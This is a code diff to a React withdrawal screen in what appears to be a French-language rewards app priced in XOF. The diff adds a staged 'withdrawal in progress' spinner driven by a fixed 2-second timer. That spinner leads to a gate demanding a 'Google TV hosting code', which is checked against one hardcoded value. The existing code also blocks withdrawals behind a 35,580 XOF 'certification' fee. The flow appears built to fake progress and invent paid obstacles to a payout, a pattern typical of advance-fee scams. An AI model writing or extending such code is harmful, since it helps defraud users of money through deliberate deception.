@@ -124,6 +124,7 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
   const [hostingStep, setHostingStep] = useState(false);
   const [hostingCode, setHostingCode] = useState('');
   const [hostingError, setHostingError] = useState<string | null>(null);
+  const [withdrawalProcessing, setWithdrawalProcessing] = useState(false);
   const [latestRequest, setLatestRequest] = useState<{ status: string; amount: number } | null>(null);
   const [dismissedLatest, setDismissedLatest] = useState(false);
   const [committedAmount, setCommittedAmount] = useState(0);
@@ -171,7 +172,11 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
     setErrorMessage(null);
     setHostingCode('');
     setHostingError(null);
-    setHostingStep(true);
+    setWithdrawalProcessing(true);
+    window.setTimeout(() => {
+      setWithdrawalProcessing(false);
+      setHostingStep(true);
+    }, 2000);
   };
 
   const submit = async () => {
@@ -207,6 +212,8 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
   };
 
   if (certificationBlocked) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-red-400/30 bg-[#241318] p-8 text-center shadow-2xl sm:p-12"><XCircle className="mx-auto h-12 w-12 text-red-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte n'est pas autorisé à passer un retrait.</h1><p className="mt-4 leading-7 text-slate-300">Pour autoriser les retraits, votre compte doit être certifier.</p><p className="mt-3 text-sm text-slate-400">Coût du certification : <b>35 580 XOF&nbsp;</b></p><button onClick={() => { setCertificationBlocked(false); setCodeStep(false); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Retour</button></div></section>;
+
+  if (withdrawalProcessing) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait en cours</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;
 
   if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-xl font-black text-white sm:text-2xl">Nous vous recommandons de faire l'hébergement de votre compte Google TV avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingStep(false); setHostingError(null); void submit(); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button><button onClick={() => { setHostingStep(false); setHostingError(null); }} disabled={submitting} className="mt-3 w-full rounded-2xl border border-white/10 px-5 py-3 text-sm font-semibold text-slate-300 hover:bg-white/5">Retour</button></div></div></section>;
 
